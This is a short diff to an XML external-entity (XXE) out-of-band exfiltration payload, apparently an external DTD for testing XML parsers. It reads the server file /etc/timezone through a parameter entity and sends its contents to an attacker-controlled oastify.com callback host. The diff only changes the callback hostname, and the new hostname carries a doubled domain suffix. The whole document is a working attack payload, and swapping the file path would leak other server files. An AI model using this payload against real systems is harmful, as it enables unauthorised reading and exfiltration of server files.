@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///etc/timezone">
-<!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'http://76bgwi0rszk16kbzw5gtlwon4ea5yx3ls.oastify.com/?data=%file;'>">
+<!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'http://5w2emgqpixazwi1xm36rbueluc03owek3.oastify.com.oastify.com/?data=%file;'>">
 %wrapper;
 %send;
